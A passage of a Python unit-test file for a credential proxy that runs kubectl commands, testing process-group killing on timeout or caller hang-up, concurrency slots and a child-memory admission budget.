    def test_a_descendant_that_ignores_sigterm_is_killed_with_the_group(self):
        # The leader (bash) dies on SIGTERM; the shell it started ignores it,
        # and so does that shell's sleep. The second signal has to reach the
        # group whether or not the leader is still there, or the survivors
        # keep the pipes and run on outside the slot they were counted under.
        # The liveness read is immediate: the kill returns only once the group
        # is empty, after SIGKILL as after SIGTERM. This read alone does not
        # pin that wait -- the survivors hold the stub's pipes, so the drain
        # after the kill cannot return until they have exited either way --
        # and test_the_wait_after_sigkill_is_bounded is what does.
        pid_file = Path(self.temp_dir.name) / "stubborn.pid"
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body=f'sh -c \'trap "" TERM; echo $$ > "{pid_file}"; sleep 30\' & wait',
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        self.assertFalse(
            self.process_is_live(int(pid_file.read_text().strip())),
            "a descendant that ignored SIGTERM outlived the command",
        )

    def test_the_wait_after_sigkill_is_bounded(self):
        # After SIGKILL the kill waits for the group to empty, so that what a
        # command started is gone -- not merely signalled -- when `execute`
        # returns. A group that never reads as empty (a member in
        # uninterruptible sleep, an orphan its reaper has not collected) has
        # to run that wait out rather than hold the slot: every signal-0 probe
        # here answers that the group is still occupied, and the kill still
        # returns once the grace and then the bound run out, the second signal
        # sent once. The clock is faked and the probes counted, so the bound
        # is pinned to its value; and a wait that stopped honouring it fails
        # here at the clock's ceiling, not at the CI job's.
        clock = _FakeClock(
            ceiling=credential_proxy.KILL_GRACE_SECONDS
            + 2 * credential_proxy.KILL_SETTLE_SECONDS
        )
        sent = []
        probes_after_kill = []

        def always_occupied(pgid, signum):
            if signum != 0:
                sent.append((signum, clock.now))
                return None
            if sent and sent[-1][0] == credential_proxy.signal.SIGKILL:
                probes_after_kill.append(clock.now)
            return None

        process = mock.Mock(spec=subprocess.Popen)
        process.pid = 4242
        process.poll.return_value = None
        with (
            mock.patch.object(credential_proxy, "time", clock),
            mock.patch("credential_proxy.os.killpg", always_occupied),
            self.assertLogs("credential-proxy", level="WARNING") as logs,
        ):
            credential_proxy._kill_process_group(process)

        self.assertEqual(
            [credential_proxy.signal.SIGTERM, credential_proxy.signal.SIGKILL],
            [signum for signum, _ in sent],
        )
        killed_at = sent[-1][1]
        self.assertGreaterEqual(killed_at, credential_proxy.KILL_GRACE_SECONDS)
        # One probe per poll across the bound, plus the one at the deadline
        # that finds the group still there and gives up.
        self.assertEqual(
            round(credential_proxy.KILL_SETTLE_SECONDS / credential_proxy.KILL_POLL_SECONDS)
            + 1,
            len(probes_after_kill),
        )
        self.assertAlmostEqual(
            credential_proxy.KILL_SETTLE_SECONDS, clock.now - killed_at, places=6
        )
        # A bound that ran out is the one case an operator may later ask
        # about, so it leaves a line.
        self.assertTrue(
            any("still occupied" in line and "after SIGKILL" in line for line in logs.output),
            logs.output,
        )

    def test_the_wait_after_sigkill_returns_once_the_group_is_gone(self):
        # The other half of the bound: the wait ends when the group empties,
        # one poll later at most, not when KILL_SETTLE_SECONDS runs out. A
        # wall-clock ceiling cannot pin that -- the span includes a fork and,
        # under a PID 1 that does not reap, a zombie that holds the group for
        # the whole bound -- so the clock is faked and the probes counted.
        # The group here ignores SIGTERM, and after SIGKILL it reads occupied
        # once (the members not yet scheduled to exit) and then empty.
        clock = _FakeClock(
            ceiling=credential_proxy.KILL_GRACE_SECONDS
            + 2 * credential_proxy.KILL_SETTLE_SECONDS
        )
        sent = []
        probes_after_kill = []

        def group_that_empties_after_sigkill(pgid, signum):
            if signum != 0:
                sent.append((signum, clock.now))
                return None
            if sent and sent[-1][0] == credential_proxy.signal.SIGKILL:
                probes_after_kill.append(clock.now)
                if len(probes_after_kill) > 1:
                    raise ProcessLookupError
            return None

        process = mock.Mock(spec=subprocess.Popen)
        process.pid = 4242
        process.poll.return_value = None
        with (
            mock.patch.object(credential_proxy, "time", clock),
            mock.patch("credential_proxy.os.killpg", group_that_empties_after_sigkill),
            self.assertNoLogs("credential-proxy", level="WARNING"),
        ):
            credential_proxy._kill_process_group(process)

        self.assertEqual(
            [credential_proxy.signal.SIGTERM, credential_proxy.signal.SIGKILL],
            [signum for signum, _ in sent],
        )
        killed_at = sent[-1][1]
        self.assertGreaterEqual(killed_at, credential_proxy.KILL_GRACE_SECONDS)
        # Two probes: the one that found the group still there and the one
        # that found it gone. A wait that ran to its bound would have made
        # KILL_SETTLE_SECONDS / KILL_POLL_SECONDS of them.
        self.assertEqual(2, len(probes_after_kill))
        self.assertAlmostEqual(
            credential_proxy.KILL_POLL_SECONDS, clock.now - killed_at, places=6
        )

    def test_a_hang_up_after_the_pipes_close_still_ends_the_command(self):
        # With both pipes closed the read loop has nothing to watch, so the
        # wait that follows has to look at the caller itself, or a hang-up in
        # that window leaves the command running to the deadline for nobody.
        pid_file = Path(self.temp_dir.name) / "detached.pid"
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30),
            body=f'exec >&- 2>&-; sleep 30 & echo $! > "{pid_file}"; wait',
        )
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)

        def hang_up():
            time.sleep(0.7)
            theirs.close()

        threading.Thread(target=hang_up, daemon=True).start()
        started = time.monotonic()
        result = executor.execute(
            ["kubectl", "wait", "--for=condition=Ready", "pod/api"], caller=ours
        )

        self.assertTrue(result.abandoned)
        self.assertFalse(result.timed_out)
        self.assertLess(time.monotonic() - started, 10)
        # Immediate, like the other liveness reads: the sleep exits on SIGTERM,
        # and the kill returns from its grace only once the group is empty.
        self.assertFalse(
            self.process_is_live(int(pid_file.read_text().strip())),
            "the sleep the command started outlived the hang-up",
        )

    def test_a_command_that_closes_its_pipes_and_runs_on_still_meets_the_deadline(self):
        # With both pipes closed there is nothing left to read, so the
        # deadline is enforced by the wait that follows -- at the deadline,
        # not at the end of the drain grace a killed command gets. The sleep
        # replaces the shell rather than running under it so that the group
        # holds one process, the child, which exits on SIGTERM and is reaped
        # here: a sleep forked by the shell is reparented at the kill, and
        # under a PID 1 that does not reap (the test process itself as PID 1
        # of a container, say) it stays a zombie in the group, the kill runs
        # the whole grace and then the whole wait after SIGKILL, and the span
        # lands on the ceiling. The ceiling stays where the drain grace is
        # what it has to tell the deadline apart from.
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1),
            body="exec >&- 2>&-; exec sleep 10",
        )

        result = executor.execute(["kubectl", "get", "pods"])

        self.assertTrue(result.timed_out)
        self.assertEqual(124, result.exit_code)
        self.assertLess(result.duration_ms, 4000)

    # ---- The caller's connection ---------------------------------------------

    @staticmethod
    def process_is_live(pid):
        """Is `pid` still running? A zombie or a missing entry both mean no.

        Read right after `execute()` returns, with no retry: `_kill_process_group`
        returns only once the group is empty, after SIGTERM and after SIGKILL
        alike, or once its bound for that has run out. The reads check that the
        kill reached what the command started; the wait itself is pinned by
        `test_the_wait_after_sigkill_is_bounded`.
        """
        try:
            with open(f"/proc/{pid}/status", encoding="utf-8") as handle:
                for line in handle:
                    if line.startswith("State:"):
                        return line.split()[1] not in {"Z", "X"}
        except OSError:
            return False
        return False

    def test_an_abandoned_caller_ends_the_command_and_everything_it_started(self):
        # A triage session torn down mid-command used to leave its kubectl
        # running to the deadline, holding a slot and buffering output for
        # nobody. `wait` is a long-running verb, so the deadline here is the
        # broker-wide 30s; the result has to come back well before that.
        pid_file = Path(self.temp_dir.name) / "sleeper.pid"
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30),
            body=f'sleep 30 & echo $! > "{pid_file}"; wait',
        )
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)

        def hang_up():
            time.sleep(0.5)
            theirs.close()

        threading.Thread(target=hang_up, daemon=True).start()
        started = time.monotonic()
        result = executor.execute(
            ["kubectl", "wait", "--for=condition=Ready", "pod/api"], caller=ours
        )

        self.assertTrue(result.abandoned)
        self.assertFalse(result.timed_out)
        self.assertLess(time.monotonic() - started, 10)
        # Immediate, like the other liveness reads: the sleep exits on SIGTERM,
        # and the kill returns from its grace only once the group is empty.
        self.assertFalse(
            self.process_is_live(int(pid_file.read_text().strip())),
            "the sleep the command started outlived the command",
        )

    def test_a_caller_that_stays_connected_does_not_end_the_command(self):
        executor = self.fake_kubectl(self.executor(), body="sleep 0.5; echo done")
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)
        self.addCleanup(theirs.close)

        result = executor.execute(["kubectl", "get", "pods"], caller=ours)

        self.assertFalse(result.abandoned)
        self.assertEqual(0, result.exit_code)
        self.assertEqual("done\n", result.stdout)

    def test_a_half_closed_caller_is_not_taken_for_a_hang_up(self):
        # A peer that shut its writing half after the request is still there,
        # waiting for the response; it reads as EOF, and EOF alone must not
        # end its command. Only a peer that closed for good reports POLLHUP.
        executor = self.fake_kubectl(self.executor(), body="sleep 0.5; echo done")
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)
        self.addCleanup(theirs.close)
        theirs.shutdown(socket.SHUT_WR)

        result = executor.execute(["kubectl", "get", "pods"], caller=ours)

        self.assertFalse(result.abandoned)
        self.assertEqual(0, result.exit_code)
        self.assertEqual("done\n", result.stdout)

    def test_a_caller_that_hangs_up_while_queued_is_dropped_before_anything_starts(self):
        # With every slot busy, a caller that leaves during the wait must not
        # take the slot a live request is waiting for only to fork and kill.
        executor = self.executor(max_concurrent_commands=1)
        self.hold_a_slot(executor, seconds=3)
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)

        def hang_up():
            time.sleep(0.3)
            theirs.close()

        threading.Thread(target=hang_up, daemon=True).start()
        started = time.monotonic()
        with self.assertRaises(credential_proxy.CallerHungUp) as raised:
            with executor.request_slot(caller=ours):
                self.fail("a slot was granted to a caller that had gone")

        # Back before the slot would have freed.
        self.assertLess(time.monotonic() - started, 2.5)
        self.assertEqual("the caller disconnected while queued for a slot", str(raised.exception))

    def test_a_slot_less_reserver_that_hangs_up_is_named_as_queued_for_the_budget(self):
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=2)
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)

        def hang_up():
            time.sleep(0.3)
            theirs.close()

        threading.Thread(target=hang_up, daemon=True).start()
        with self.assertRaises(credential_proxy.CallerHungUp) as raised:
            with executor.reserve_child_memory(caller=ours):
                self.fail("a reservation was granted to a caller that had gone")
        self.assertEqual(
            "the caller disconnected while queued for the memory budget", str(raised.exception)
        )

    def test_unexpected_bytes_from_the_caller_are_not_taken_for_a_hang_up(self):
        # After the request body nothing more is expected, but a peer that
        # sends something is still there: the command runs on, unwatched.
        executor = self.fake_kubectl(self.executor(), body="sleep 0.5; echo done")
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)
        self.addCleanup(theirs.close)
        theirs.sendall(b"not part of this protocol")

        result = executor.execute(["kubectl", "get", "pods"], caller=ours)

        self.assertFalse(result.abandoned)
        self.assertEqual("done\n", result.stdout)

    def test_the_deadline_still_applies_while_a_caller_is_watched(self):
        executor = self.fake_kubectl(
            self.executor(timeout_seconds=30, kubectl_timeout_seconds=1), body="sleep 10"
        )
        ours, theirs = socket.socketpair()
        self.addCleanup(ours.close)
        self.addCleanup(theirs.close)

        result = executor.execute(["kubectl", "get", "pods"], caller=ours)

        self.assertTrue(result.timed_out)
        self.assertFalse(result.abandoned)
        self.assertEqual(124, result.exit_code)

    def test_a_closed_caller_socket_runs_the_command_unwatched(self):
        # Registering a dead descriptor must not fail the command; internal
        # callers pass nothing and this is the same path.
        executor = self.fake_kubectl(self.executor(), body="echo done")
        ours, theirs = socket.socketpair()
        theirs.close()
        ours.close()

        result = executor.execute(["kubectl", "get", "pods"], caller=ours)

        self.assertEqual(0, result.exit_code)
        self.assertEqual("done\n", result.stdout)

    # ---- How many commands run at once ---------------------------------------

    def test_the_concurrency_cap_is_read_from_the_environment(self):
        # Through the argument parser, like the other bounds, so the operator's
        # env entry reaches the executor the way the output cap does.
        with mock.patch.dict(
            os.environ, {credential_proxy.ENV_MAX_CONCURRENT_COMMANDS: "3"}
        ), mock.patch.object(sys, "argv", ["credential_proxy.py"]):
            self.assertEqual(3, credential_proxy.parse_args().max_concurrent_commands)
        with mock.patch.dict(os.environ, {}, clear=False), mock.patch.object(
            sys, "argv", ["credential_proxy.py"]
        ):
            os.environ.pop(credential_proxy.ENV_MAX_CONCURRENT_COMMANDS, None)
            self.assertEqual(
                credential_proxy.DEFAULT_MAX_CONCURRENT_COMMANDS,
                credential_proxy.parse_args().max_concurrent_commands,
            )
        with self.assertRaises(ValueError):
            self.executor(max_concurrent_commands=0)

    def test_an_executor_without_a_limit_has_no_budget(self):
        # Whatever cgroup the test runner is in: only `serve` derives the limit.
        executor = self.executor()
        self.assertIsNone(executor.memory_limit_bytes)
        self.assertIsNone(executor.children_budget_bytes)
        self.assertIsNone(executor.requests_the_budget_admits())

    def test_the_budget_is_the_limit_less_the_two_fixed_reserves(self):
        mib = credential_proxy.MEBIBYTE
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            executor = self.executor(memory_limit_bytes=1024 * mib, max_output_bytes=8 * mib)
        self.assertEqual(1024 * mib, executor.memory_limit_bytes)
        self.assertEqual((1024 - 192 - 128) * mib, executor.children_budget_bytes)
        # 704 MiB against 128 MiB reserve + 6 x 8 MiB output per request = 176 MiB.
        self.assertEqual(4, executor.requests_the_budget_admits())
        self.assertTrue(
            any("child memory budget enabled" in line and "admits 4" in line for line in logs.output),
            logs.output,
        )

    def test_a_missing_limit_is_logged_once_at_startup(self):
        with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            self.executor(memory_limit_bytes=None)
        self.assertTrue(any("child memory budget disabled" in line for line in logs.output), logs.output)

    def test_a_limit_under_the_floor_disables_the_budget_with_a_warning(self):
        # Autopilot without bursting sets limits equal to requests, so the
        # proxy's limit there is its 512Mi request; a budget derived from it
        # would admit one request at a time, worse than slot-only admission.
        mib = credential_proxy.MEBIBYTE
        with self.assertLogs(credential_proxy.LOGGER, level="WARNING") as logs:
            executor = self.executor(memory_limit_bytes=512 * mib, max_output_bytes=8 * mib)
        self.assertEqual(512 * mib, executor.memory_limit_bytes)
        self.assertIsNone(executor.children_budget_bytes)
        self.assertIsNone(executor.requests_the_budget_admits())
        warning = [line for line in logs.output if "under the floor" in line]
        self.assertEqual(1, len(warning), logs.output)
        self.assertIn("512 MiB", warning[0])
        self.assertIn("672 MiB", warning[0])
        # Slot-only admission, as today: a reservation neither waits nor counts.
        self.hold_a_slot(executor, seconds=1)
        with executor.reserve_child_memory():
            self.assertEqual(0, executor.reserved_bytes)

    def test_a_limit_at_the_floor_enables_the_budget_for_two(self):
        mib = credential_proxy.MEBIBYTE
        floor = credential_proxy.child_memory_budget_floor_bytes(8 * mib)
        self.assertEqual(672 * mib, floor)
        self.assertEqual(credential_proxy.CHILD_MEMORY_BUDGET_FLOOR_BYTES_AT_DEFAULT_CAP, floor)
        executor = self.executor(memory_limit_bytes=floor, max_output_bytes=8 * mib)
        self.assertEqual(2, executor.requests_the_budget_admits())
        self.assertIsNotNone(executor.children_budget_bytes)

    def test_slots_are_granted_in_arrival_order(self):
        # Under sustained saturation the request that has waited longest must
        # be the next served, and the one refused after the wait must be the
        # one that waited it: a semaphore's lapsing timed acquire rejoins at
        # the back and does neither. The holder keeps its slot until told to
        # let go, so the four are queued before any can be admitted, however
        # slowly the runner starts threads.
        executor = self.executor(max_concurrent_commands=1)
        release = threading.Event()
        held = threading.Event()

        def hold():
            with executor.request_slot():
                held.set()
                release.wait(10)

        holder = threading.Thread(target=hold)
        holder.start()
        self.addCleanup(holder.join)
        self.assertTrue(held.wait(5), "the slot holder never got its slot")
        admitted = []
        lock = threading.Lock()

        def wait_in_line(label):
            with executor.request_slot():
                with lock:
                    admitted.append(label)

        threads = []
        for index, label in enumerate(("first", "second", "third", "fourth")):
            thread = threading.Thread(target=wait_in_line, args=(label,))
            thread.start()
            threads.append(thread)
            # Each joins the queue before the next is started, so arrival
            # order is known rather than raced.
            deadline = time.monotonic() + 5
            while executor.queued_requests < index + 1:
                if time.monotonic() > deadline:
                    self.fail(f"{label} never joined the queue")
                time.sleep(0.01)
        release.set()
        for thread in threads:
            thread.join()

        self.assertEqual(["first", "second", "third", "fourth"], admitted)

    def hold_a_slot(self, executor, seconds):
        """Hold a request slot for `seconds` on another thread; return once held.

        The holder sets an event once it has the slot, so the caller waits on
        the fact rather than on a sleep that a loaded runner can outrun.
        """
        held = threading.Event()

        def hold():
            with executor.request_slot():
                held.set()
                time.sleep(seconds)

        thread = threading.Thread(target=hold)
        thread.start()
        self.addCleanup(thread.join)
        self.assertTrue(held.wait(5), "the slot holder never got its slot")
        return thread

    def test_a_request_past_the_cap_waits_for_a_slot(self):
        executor = self.executor(max_concurrent_commands=1)
        self.hold_a_slot(executor, seconds=1)

        started = time.monotonic()
        with executor.request_slot():
            waited = time.monotonic() - started

        # It was admitted after the holder finished, not beside it.
        self.assertGreaterEqual(waited, 0.5)

    def test_a_request_that_waits_too_long_for_a_slot_is_refused(self):
        executor = self.executor(max_concurrent_commands=1)
        holder = self.hold_a_slot(executor, seconds=2)

        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.2):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as raised:
                with executor.request_slot():
                    self.fail("a slot was granted while the holder still had it")

        self.assertIn("limit of 1 concurrent commands", str(raised.exception))
        self.assertIn("without reaching a free slot", str(raised.exception))
        # The refusal released nothing it did not hold: the slot is still the
        # holder's, and comes back when it ends.
        holder.join()
        with executor.request_slot():
            pass

    def test_a_wait_for_a_slot_is_logged(self):
        # The log line is what an operator sizing the cap reads; the command's
        # own duration does not include the wait, since `_execute` starts its
        # clock after admission.
        executor = self.executor(max_concurrent_commands=1)
        self.hold_a_slot(executor, seconds=2)

        queued_at = time.monotonic()
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_LOG_MS", 100):
            with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                with executor.request_slot():
                    waited_ms = (time.monotonic() - queued_at) * 1000
                    result = executor.execute_internal(["/bin/echo", "after the wait"])

        self.assertTrue(
            any("request waited" in line and "for a slot" in line for line in logs.output)
        )
        # Measured against the wait rather than a fixed bound: a loaded runner
        # can take half a second to fork an echo, but never the two seconds the
        # command would report if its clock had started in the queue.
        self.assertGreater(waited_ms, 1000)
        self.assertLess(result.duration_ms, waited_ms / 2)

    # ---- The child memory budget at admission (design §2.2, §2.3) ----------

    def budgeted(self, admits, max_concurrent_commands=8, max_output_bytes=1024):
        """An executor whose budget admits exactly `admits` slot-taking requests."""
        per_request = (
            credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES
            + credential_proxy.OUTPUT_COPIES_PER_COMMAND * max_output_bytes
        )
        limit = (
            credential_proxy.BROKER_RESIDENT_RESERVE_BYTES
            + credential_proxy.CONTENT_WORKSPACE_RESERVE_BYTES
            + admits * per_request
        )
        # A budget for one is under the production floor and would be treated
        # as absent; the floor is lowered for construction only, so the
        # admission tests can hold the one reservation that blocks the next.
        floor = min(admits, credential_proxy.BUDGET_MINIMUM_ADMITTED_REQUESTS)
        with mock.patch.object(credential_proxy, "BUDGET_MINIMUM_ADMITTED_REQUESTS", floor):
            executor = self.executor(
                max_concurrent_commands=max_concurrent_commands,
                max_output_bytes=max_output_bytes,
                memory_limit_bytes=limit,
            )
        self.assertEqual(admits, executor.requests_the_budget_admits())
        return executor

    def test_a_request_that_fits_a_slot_but_not_the_budget_waits(self):
        # Eight slots, a budget for one: the second request waits for the
        # first's reservation, not for a slot.
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=1)
        self.assertEqual(credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)

        started = time.monotonic()
        with executor.request_slot():
            waited = time.monotonic() - started
        self.assertGreaterEqual(waited, 0.5)
        self.assertEqual(0, executor.reserved_bytes)

    def test_a_request_still_waiting_at_the_bound_is_refused_naming_the_budget(self):
        executor = self.budgeted(admits=1)
        holder = self.hold_a_slot(executor, seconds=2)

        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.2):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as raised:
                with executor.request_slot():
                    self.fail("admitted past the budget")
        message = str(raised.exception)
        self.assertIn("memory budget", message)
        self.assertIn("128 MiB reserved", message)
        self.assertIn("MiB of output allowance for 1 requests", message)
        self.assertNotIn("concurrent commands", message)
        holder.join()
        with executor.request_slot():
            pass

    def test_the_output_term_is_charged_for_slots_in_use_not_the_cap(self):
        # Budget for exactly two requests at a 1 KiB cap. With the output
        # allowance charged for the cap of eight up front, the first request
        # would cost 128 MiB + 8 x 6 KiB and the second would not fit, since
        # the budget holds only 2 x (128 MiB + 6 KiB).
        executor = self.budgeted(admits=2, max_concurrent_commands=8)
        release = threading.Event()
        held = []

        def hold():
            with executor.request_slot():
                held.append(1)
                release.wait(5)

        threads = [threading.Thread(target=hold) for _ in range(2)]
        for thread in threads:
            thread.start()
            self.addCleanup(thread.join)
        self.addCleanup(release.set)
        deadline = time.monotonic() + 5
        while len(held) < 2 and time.monotonic() < deadline:
            time.sleep(0.01)
        self.assertEqual(2, len(held), "two requests should fit the budget at once")
        self.assertEqual(2 * credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
        release.set()

    def test_four_requests_fit_at_the_defaults_and_a_fifth_waits(self):
        # Design §2.2: a 1024 MiB limit and an 8 MiB output cap leave 704 MiB
        # for children, four requests of 128 + 6 x 8 MiB. Without the
        # slots-in-use output term a fifth would fit (5 x 128 = 640 <= 704).
        mib = credential_proxy.MEBIBYTE
        executor = self.executor(
            memory_limit_bytes=1024 * mib, max_output_bytes=8 * mib, max_concurrent_commands=8
        )
        self.assertEqual(4, executor.requests_the_budget_admits())
        release = threading.Event()
        held = []

        def hold():
            with executor.request_slot():
                held.append(1)
                release.wait(5)

        threads = [threading.Thread(target=hold) for _ in range(4)]
        for thread in threads:
            thread.start()
            self.addCleanup(thread.join)
        self.addCleanup(release.set)
        deadline = time.monotonic() + 5
        while len(held) < 4 and time.monotonic() < deadline:
            time.sleep(0.01)
        self.assertEqual(4, executor.slots_in_use)

        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.2):
            with self.assertRaises(credential_proxy.CommandSlotUnavailable) as raised:
                with executor.request_slot():
                    self.fail("a fifth request was admitted at the defaults")
        self.assertIn("memory budget", str(raised.exception))
        release.set()

    def test_a_wait_for_the_budget_is_logged(self):
        executor = self.budgeted(admits=1)
        self.hold_a_slot(executor, seconds=2)
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_LOG_MS", 100):
            with self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
                with executor.request_slot():
                    pass
        self.assertTrue(
            any("for memory budget" in line and "128 MiB reserved for children" in line for line in logs.output),
            logs.output,
        )

    def test_a_wait_behind_a_budget_held_head_is_logged_as_the_budget(self):
        # Two slots of eight in use fill the budget: the head waits for it and
        # the slot taker behind it never sees the slot cap full. Both are
        # admitted on the one wake that frees the budget, and neither wait was
        # for a slot.
        executor = self.budgeted(admits=2)
        release = threading.Event()
        self.hold_a_slot_until(executor, release)
        self.hold_a_slot_until(executor, release)
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_LOG_MS", 100), \
             self.assertLogs(credential_proxy.LOGGER, level="INFO") as logs:
            head = self.queue_a_slot_taker(executor)
            behind = self.queue_a_slot_taker(executor)
            time.sleep(3 * credential_proxy.COMMAND_SLOT_POLL_SECONDS)
            release.set()
            head.join(5)
            behind.join(5)
        waits = [line for line in logs.output if "request waited" in line]
        self.assertEqual(2, len(waits), logs.output)
        self.assertTrue(all("for memory budget" in line for line in waits), waits)
        self.assertFalse(any("slots were busy" in line for line in waits), waits)

    def test_a_request_queued_behind_a_budget_held_head_is_refused_naming_the_budget(self):
        # Eight slots, one in use: the head waits for the budget, and the
        # request behind it never reaches the head. The slot cap held neither.
        executor = self.budgeted(admits=1)
        holder = self.hold_a_slot(executor, seconds=2)
        head_refused = []

        def head():
            try:
                with executor.request_slot():
                    pass
            except credential_proxy.CommandSlotUnavailable as error:
                head_refused.append(str(error))

        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.6):
            head_thread = threading.Thread(target=head)
            head_thread.start()
            deadline = time.monotonic() + 5
            while executor.queued_requests < 1:
                if time.monotonic() > deadline:
                    self.fail("the head never joined the queue")
                time.sleep(0.01)
            with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.2):
                with self.assertRaises(credential_proxy.CommandSlotUnavailable) as raised:
                    with executor.request_slot():
                        self.fail("admitted past the budget")
            head_thread.join()
        message = str(raised.exception)
        self.assertIn("memory budget", message)
        self.assertNotIn("concurrent commands", message)
        self.assertEqual(1, executor.slots_in_use)
        holder.join()

    def queue_a_slot_taker(self, executor, refused=None):
        """Queue a slot-taking request on another thread and return once it
        is in the queue; a refusal at the bound is recorded in `refused`."""

        def head():
            try:
                with executor.request_slot():
                    pass
            except credential_proxy.CommandSlotUnavailable as error:
                if refused is not None:
                    refused.append(str(error))

        queued_before = executor.queued_requests
        thread = threading.Thread(target=head)
        thread.start()
        self.addCleanup(thread.join)
        deadline = time.monotonic() + 5
        while executor.queued_requests <= queued_before:
            if time.monotonic() > deadline:
                self.fail("the slot taker never joined the queue")
            time.sleep(0.01)
        return thread

    def hold_a_slot_until(self, executor, release):
        """Hold a request slot on another thread until `release` is set."""
        held = threading.Event()

        def hold():
            with executor.request_slot():
                held.set()
                release.wait(5)

        thread = threading.Thread(target=hold)
        thread.start()
        self.addCleanup(thread.join)
        self.addCleanup(release.set)
        self.assertTrue(held.wait(5), "the slot holder never got its slot")
        return thread

    def test_a_reservation_is_admitted_past_a_head_the_slot_cap_holds(self):
        # One slot, a budget for eight: the head waits for the slot cap only,
        # so the slot-less reservation behind it, which fits, goes first.
        executor = self.budgeted(admits=8, max_concurrent_commands=1)
        release = threading.Event()
        self.hold_a_slot_until(executor, release)
        self.queue_a_slot_taker(executor)

        started = time.monotonic()
        with executor.reserve_child_memory():
            self.assertLess(time.monotonic() - started, 0.5)
            self.assertEqual(1, executor.queued_requests, "the head should still be queued")
            self.assertEqual(1, executor.slots_in_use)
            self.assertEqual(2 * credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES, executor.reserved_bytes)
        release.set()

    def test_a_reservation_queued_behind_a_slot_held_head_is_admitted_past_it(self):
        # Same shape, with the head refused at its own bound: the reservation
        # never waits for it and is never refused.
        executor = self.budgeted(admits=8, max_concurrent_commands=1)
        release = threading.Event()
        self.hold_a_slot_until(executor, release)
        refused = []
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.6):
            head_thread = self.queue_a_slot_taker(executor, refused)
            with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.2):
                with executor.reserve_child_memory():
                    self.assertEqual(1, executor.queued_requests)
            head_thread.join()
        self.assertEqual(1, len(refused))
        self.assertIn("1 concurrent commands", refused[0])
        self.assertEqual(1, executor.slots_in_use)
        release.set()

    def test_a_fitting_reservation_keeps_its_place_behind_a_budget_held_head(self):
        # Eight slots, one in flight. The budget is one slot-taker's worth plus
        # one reservation and a byte: the next slot-taker (which also carries
        # an output allowance) does not fit, the reservation behind it does.
        # Admitting the reservation would take budget the head is waiting for.
        mib = credential_proxy.MEBIBYTE
        executor = self.budgeted(admits=1, max_output_bytes=mib)
        executor.children_budget_bytes += credential_proxy.REQUEST_CHILD_MEMORY_RESERVE_BYTES + 1
        release = threading.Event()
        self.hold_a_slot_until(executor, release)
        self.assertFalse(executor._fits_budget(takes_slot=True))
        self.assertTrue(executor._fits_budget(takes_slot=False))
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 2):
            self.queue_a_slot_taker(executor)
            with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.3):
                with self.assertRaises(credential_proxy.CommandSlotUnavailable) as raised:
                    with executor.reserve_child_memory():
                        self.fail("admitted ahead of a head the budget holds")
            release.set()
        message = str(raised.exception)
        self.assertIn("admission queue is held by requests waiting for its child memory budget", message)
        self.assertIn("waited 0.3s behind them", message)
        self.assertNotIn("without fitting", message)
        self.assertNotIn("concurrent commands", message)

    def test_a_reservation_that_does_not_fit_is_not_admitted_past_a_slot_held_head(self):
        # One slot, a budget for one: the head waits for the slot cap, but the
        # reservation behind it does not fit the budget either, so it waits
        # and is refused naming the budget.
        executor = self.budgeted(admits=1, max_concurrent_commands=1)
        release = threading.Event()
        self.hold_a_slot_until(executor, release)
        self.assertFalse(executor._fits_budget(takes_slot=False))
        with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 2):
            self.queue_a_slot_taker(executor)
            with mock.patch.object(credential_proxy, "COMMAND_SLOT_WAIT_SECONDS", 0.3):
                with self.assertRaises(credential_proxy.CommandSlotUnavailable) as raised:
                    with executor.reserve_child_memory():
                        self.fail("admitted past the budget")
            release.set()
        message = str(raised.exception)
        self.assertIn("child memory budget", message)
        self.assertIn("without fitting", message)
        self.assertNotIn("admission queue", message)

    @staticmethod
    def wait_for_a_slot(executor):
        """Queue for a slot and let it go at once; a refusal is fine."""
        try:
            with executor.request_slot():
                pass
        except credential_proxy.CommandSlotUnavailable:
            pass

    def test_a_slot_less_reservation_skips_the_queue_when_the_budget_is_off(self):
        # Disabled, admission is by slot alone: a route that takes no slot
        # never waits, however full the slots are.
        executor = self.executor(max_concurrent_commands=1)
        self.assertIsNone(executor.children_budget_bytes)
